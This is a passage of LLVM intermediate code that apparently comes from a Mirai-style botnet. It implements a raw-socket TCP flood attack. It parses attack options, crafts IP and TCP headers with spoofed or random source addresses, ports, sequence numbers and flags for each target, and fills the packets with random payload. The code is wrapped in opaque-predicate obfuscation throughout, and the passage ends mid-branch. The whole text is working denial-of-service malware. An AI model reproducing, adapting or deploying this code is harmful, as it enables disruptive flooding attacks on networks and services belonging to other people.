  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = add nsw i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %31, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %12, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %133

; <label>:116:                                    ; preds = %5
  %117 = load i32, i32* @x.25
  %118 = load i32, i32* @y.26
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %116
  %125 = load i32, i32* @x.25
  %126 = load i32, i32* @y.26
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %670

; <label>:133:                                    ; preds = %5
  %134 = load i32, i32* @x.25
  %135 = load i32, i32* @y.26
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %133
  store i32 1, i32* %11, align 4
  %142 = load i32, i32* %12, align 4
  %143 = bitcast i32* %11 to i8*
  %144 = call i32 @setsockopt(i32 %142, i32 0, i32 3, i8* %143, i32 4) #6
  %145 = icmp eq i32 %144, -1
  %146 = load i32, i32* @x.25
  %147 = load i32, i32* @y.26
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %145, label %154, label %157

; <label>:154:                                    ; preds = %originalBBpart24
  %155 = load i32, i32* %12, align 4
  %156 = call i32 @close(i32 %155)
  br label %670

; <label>:157:                                    ; preds = %originalBBpart24
  store i32 0, i32* %11, align 4
  br label %158

; <label>:158:                                    ; preds = %originalBBpart2194, %157
  %159 = load i32, i32* %11, align 4
  %160 = load i8, i8* %7, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp slt i32 %159, %161
  br i1 %162, label %163, label %356

; <label>:163:                                    ; preds = %158
  %164 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %165 = load i8**, i8*** %13, align 8
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8*, i8** %165, i64 %167
  store i8* %164, i8** %168, align 8
  %169 = load i8**, i8*** %13, align 8
  %170 = load i32, i32* %11, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds i8*, i8** %169, i64 %171
  %173 = load i8*, i8** %172, align 8
  %174 = bitcast i8* %173 to %struct.iphdr*
  store %struct.iphdr* %174, %struct.iphdr** %32, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i64 1
  %177 = bitcast %struct.iphdr* %176 to %struct.tcphdr*
  store %struct.tcphdr* %177, %struct.tcphdr** %33, align 8
  %178 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i64 1
  %180 = bitcast %struct.tcphdr* %179 to i8*
  store i8* %180, i8** %34, align 8
  %181 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %182 = bitcast %struct.iphdr* %181 to i8*
  %183 = load i8, i8* %182, align 4
  %184 = and i8 %183, 15
  %185 = or i8 %184, 64
  store i8 %185, i8* %182, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, -16
  %190 = or i8 %189, 5
  store i8 %190, i8* %187, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 1
  store i8 %191, i8* %193, align 1
  %194 = load i32, i32* %28, align 4
  %195 = sext i32 %194 to i64
  %196 = add i64 40, %195
  %197 = trunc i64 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  %201 = load i16, i16* %15, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %16, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %17, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

; <label>:210:                                    ; preds = %163
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %210, %163
  %215 = load i32, i32* @x.25
  %216 = load i32, i32* @y.26
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %214
  %223 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 6
  store i8 6, i8* %224, align 1
  %225 = load i32, i32* %30, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 8
  store i32 %225, i32* %227, align 4
  %228 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %229 = load i32, i32* %11, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i32 0, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  %236 = load i16, i16* %18, align 2
  %237 = call zeroext i16 @htons(i16 zeroext %236) #7
  %238 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 0
  store i16 %237, i16* %239, align 4
  %240 = load i16, i16* %19, align 2
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 1
  store i16 %241, i16* %243, align 2
  %244 = load i32, i32* %20, align 4
  %245 = trunc i32 %244 to i16
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = zext i16 %246 to i32
  %248 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 2
  store i32 %247, i32* %249, align 4
  %250 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = and i16 %252, -241
  %254 = or i16 %253, 80
  store i16 %254, i16* %251, align 4
  %255 = load i8, i8* %22, align 1
  %256 = sext i8 %255 to i16
  %257 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %258 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %257, i32 0, i32 4
  %259 = load i16, i16* %258, align 4
  %260 = and i16 %256, 1
  %261 = shl i16 %260, 13
  %262 = and i16 %259, -8193
  %263 = or i16 %262, %261
  store i16 %263, i16* %258, align 4
  %264 = load i8, i8* %23, align 1
  %265 = sext i8 %264 to i16
  %266 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = and i16 %265, 1
  %270 = shl i16 %269, 12
  %271 = and i16 %268, -4097
  %272 = or i16 %271, %270
  store i16 %272, i16* %267, align 4
  %273 = load i8, i8* %24, align 1
  %274 = sext i8 %273 to i16
  %275 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %276 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %275, i32 0, i32 4
  %277 = load i16, i16* %276, align 4
  %278 = and i16 %274, 1
  %279 = shl i16 %278, 11
  %280 = and i16 %277, -2049
  %281 = or i16 %280, %279
  store i16 %281, i16* %276, align 4
  %282 = load i8, i8* %25, align 1
  %283 = sext i8 %282 to i16
  %284 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 4
  %286 = load i16, i16* %285, align 4
  %287 = and i16 %283, 1
  %288 = shl i16 %287, 10
  %289 = and i16 %286, -1025
  %290 = or i16 %289, %288
  store i16 %290, i16* %285, align 4
  %291 = load i8, i8* %26, align 1
  %292 = sext i8 %291 to i16
  %293 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = and i16 %292, 1
  %297 = shl i16 %296, 9
  %298 = and i16 %295, -513
  %299 = or i16 %298, %297
  store i16 %299, i16* %294, align 4
  %300 = load i8, i8* %27, align 1
  %301 = sext i8 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 4
  %304 = load i16, i16* %303, align 4
  %305 = and i16 %301, 1
  %306 = shl i16 %305, 8
  %307 = and i16 %304, -257
  %308 = or i16 %307, %306
  store i16 %308, i16* %303, align 4
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %313 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %312, i32 0, i32 5
  store i16 %311, i16* %313, align 2
  %314 = load i8, i8* %24, align 1
  %315 = icmp ne i8 %314, 0
  %316 = load i32, i32* @x.25
  %317 = load i32, i32* @y.26
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart2184, label %originalBB6alteredBB

originalBBpart2184:                               ; preds = %originalBB6
  br i1 %315, label %324, label %330

; <label>:324:                                    ; preds = %originalBBpart2184
  %325 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 4
  %327 = load i16, i16* %326, align 4
  %328 = and i16 %327, -2049
  %329 = or i16 %328, 2048
  store i16 %329, i16* %326, align 4
  br label %330

; <label>:330:                                    ; preds = %324, %originalBBpart2184
  %331 = load i8*, i8** %34, align 8
  %332 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %331, i32 %332)
  %333 = load i8*, i8** %34, align 8
  %334 = load i32, i32* %28, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds i8, i8* %333, i64 %335
  store i8 0, i8* %336, align 1
  br label %337

; <label>:337:                                    ; preds = %330
  %338 = load i32, i32* @x.25
  %339 = load i32, i32* @y.26
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %337
  %346 = load i32, i32* %11, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %11, align 4
  %348 = load i32, i32* @x.25
  %349 = load i32, i32* @y.26
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart2194, label %originalBB186alteredBB

originalBBpart2194:                               ; preds = %originalBB186
  br label %158

; <label>:356:                                    ; preds = %158
  %357 = load i32, i32* @x.25
  %358 = load i32, i32* @y.26
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB196, label %originalBB196alteredBB

originalBB196:                                    ; preds = %originalBB196alteredBB, %356
  %365 = load i32, i32* @x.25
  %366 = load i32, i32* @y.26
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBBpart2198, label %originalBB196alteredBB

originalBBpart2198:                               ; preds = %originalBB196
  br label %373

; <label>:373:                                    ; preds = %669, %originalBBpart2198
  store i32 0, i32* %11, align 4
  br label %374

; <label>:374:                                    ; preds = %644, %373
  %375 = load i32, i32* %11, align 4
  %376 = load i8, i8* %7, align 1
  %377 = zext i8 %376 to i32
  %378 = icmp slt i32 %375, %377
  br i1 %378, label %379, label %647

; <label>:379:                                    ; preds = %374
  %380 = load i8**, i8*** %13, align 8
  %381 = load i32, i32* %11, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds i8*, i8** %380, i64 %382
  %384 = load i8*, i8** %383, align 8
  store i8* %384, i8** %35, align 8
  %385 = load i8*, i8** %35, align 8
  %386 = bitcast i8* %385 to %struct.iphdr*
  store %struct.iphdr* %386, %struct.iphdr** %36, align 8
  %387 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i64 1
  %389 = bitcast %struct.iphdr* %388 to %struct.tcphdr*
  store %struct.tcphdr* %389, %struct.tcphdr** %37, align 8
  %390 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i64 1
  %392 = bitcast %struct.tcphdr* %391 to i8*
  store i8* %392, i8** %38, align 8
  %393 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %394 = load i32, i32* %11, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i64 %395
  %397 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %396, i32 0, i32 2
  %398 = load i8, i8* %397, align 4
  %399 = zext i8 %398 to i32
  %400 = icmp slt i32 %399, 32
  br i1 %400, label %401, label %422

; <label>:401:                                    ; preds = %379
  %402 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %403 = load i32, i32* %11, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i32 0, i32 1
  %407 = load i32, i32* %406, align 4
  %408 = call i32 @ntohl(i32 %407) #7
  %409 = call i32 @rand_next()
  %410 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %411 = load i32, i32* %11, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i32 0, i32 2
  %415 = load i8, i8* %414, align 4
  %416 = zext i8 %415 to i32
  %417 = lshr i32 %409, %416
  %418 = add i32 %408, %417
  %419 = call i32 @htonl(i32 %418) #7
  %420 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 9
  store i32 %419, i32* %421, align 4
  br label %422

; <label>:422:                                    ; preds = %401, %379
  %423 = load i32, i32* %30, align 4
  %424 = icmp eq i32 %423, -1
  br i1 %424, label %425, label %429

; <label>:425:                                    ; preds = %422
  %426 = call i32 @rand_next()
  %427 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 8
  store i32 %426, i32* %428, align 4
  br label %429

; <label>:429:                                    ; preds = %425, %422
  %430 = load i32, i32* @x.25
  %431 = load i32, i32* @y.26
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBB200, label %originalBB200alteredBB

originalBB200:                                    ; preds = %originalBB200alteredBB, %429
  %438 = load i16, i16* %15, align 2
  %439 = zext i16 %438 to i32
  %440 = icmp eq i32 %439, 65535
  %441 = load i32, i32* @x.25
  %442 = load i32, i32* @y.26
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart2202, label %originalBB200alteredBB

originalBBpart2202:                               ; preds = %originalBB200
  br i1 %440, label %449, label %471

; <label>:449:                                    ; preds = %originalBBpart2202
  %450 = load i32, i32* @x.25
  %451 = load i32, i32* @y.26
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB204, label %originalBB204alteredBB

originalBB204:                                    ; preds = %originalBB204alteredBB, %449
  %458 = call i32 @rand_next()
  %459 = and i32 %458, 65535
  %460 = trunc i32 %459 to i16
  %461 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 3
  store i16 %460, i16* %462, align 4
  %463 = load i32, i32* @x.25
  %464 = load i32, i32* @y.26
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart2218, label %originalBB204alteredBB

originalBBpart2218:                               ; preds = %originalBB204
  br label %471

; <label>:471:                                    ; preds = %originalBBpart2218, %originalBBpart2202
  %472 = load i16, i16* %18, align 2
  %473 = zext i16 %472 to i32
  %474 = icmp eq i32 %473, 65535
  br i1 %474, label %475, label %497

; <label>:475:                                    ; preds = %471
  %476 = load i32, i32* @x.25
  %477 = load i32, i32* @y.26
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB220, label %originalBB220alteredBB

originalBB220:                                    ; preds = %originalBB220alteredBB, %475
  %484 = call i32 @rand_next()
  %485 = and i32 %484, 65535
  %486 = trunc i32 %485 to i16
  %487 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %488 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %487, i32 0, i32 0
  store i16 %486, i16* %488, align 4
  %489 = load i32, i32* @x.25
  %490 = load i32, i32* @y.26
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBBpart2224, label %originalBB220alteredBB

originalBBpart2224:                               ; preds = %originalBB220
  br label %497

; <label>:497:                                    ; preds = %originalBBpart2224, %471
  %498 = load i16, i16* %19, align 2
  %499 = zext i16 %498 to i32
  %500 = icmp eq i32 %499, 65535
  br i1 %500, label %501, label %523

; <label>:501:                                    ; preds = %497
  %502 = load i32, i32* @x.25
  %503 = load i32, i32* @y.26
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %501
  %510 = call i32 @rand_next()
  %511 = and i32 %510, 65535
  %512 = trunc i32 %511 to i16
  %513 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 1
  store i16 %512, i16* %514, align 2
  %515 = load i32, i32* @x.25
  %516 = load i32, i32* @y.26
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBBpart2239, label %originalBB226alteredBB

originalBBpart2239:                               ; preds = %originalBB226
  br label %523

; <label>:523:                                    ; preds = %originalBBpart2239, %497
  %524 = load i32, i32* @x.25
  %525 = load i32, i32* @y.26
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB241, label %originalBB241alteredBB

originalBB241:                                    ; preds = %originalBB241alteredBB, %523
  %532 = load i32, i32* %20, align 4
  %533 = icmp eq i32 %532, 65535
  %534 = load i32, i32* @x.25
  %535 = load i32, i32* @y.26
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBBpart2243, label %originalBB241alteredBB

originalBBpart2243:                               ; preds = %originalBB241
  br i1 %533, label %542, label %562

; <label>:542:                                    ; preds = %originalBBpart2243
  %543 = load i32, i32* @x.25
  %544 = load i32, i32* @y.26
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB245, label %originalBB245alteredBB

originalBB245:                                    ; preds = %originalBB245alteredBB, %542
  %551 = call i32 @rand_next()
  %552 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %553 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %552, i32 0, i32 2
  store i32 %551, i32* %553, align 4
  %554 = load i32, i32* @x.25
  %555 = load i32, i32* @y.26
  %556 = sub i32 %554, 1
  %557 = mul i32 %554, %556
  %558 = urem i32 %557, 2
  %559 = icmp eq i32 %558, 0
  %560 = icmp slt i32 %555, 10
  %561 = or i1 %559, %560
  br i1 %561, label %originalBBpart2247, label %originalBB245alteredBB

originalBBpart2247:                               ; preds = %originalBB245
  br label %562

; <label>:562:                                    ; preds = %originalBBpart2247, %originalBBpart2243
  %563 = load i32, i32* %21, align 4
  %564 = icmp eq i32 %563, 65535
  br i1 %564, label %565, label %569

; <label>:565:                                    ; preds = %562
  %566 = call i32 @rand_next()
  %567 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %568 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %567, i32 0, i32 3
  store i32 %566, i32* %568, align 4
  br label %569

; <label>:569:                                    ; preds = %565, %562
  %570 = load i8, i8* %29, align 1
  %571 = icmp ne i8 %570, 0
  br i1 %571, label %572, label %579

; <label>:572:                                    ; preds = %569
  %573 = load i8*, i8** %38, align 8
  %574 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %573, i32 %574)
  %575 = load i8*, i8** %38, align 8
  %576 = load i32, i32* %28, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds i8, i8* %575, i64 %577
  store i8 0, i8* %578, align 1
  br label %579

; <label>:579:                                    ; preds = %572, %569
  %580 = load i32, i32* @x.25
  %581 = load i32, i32* @y.26
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB249, label %originalBB249alteredBB

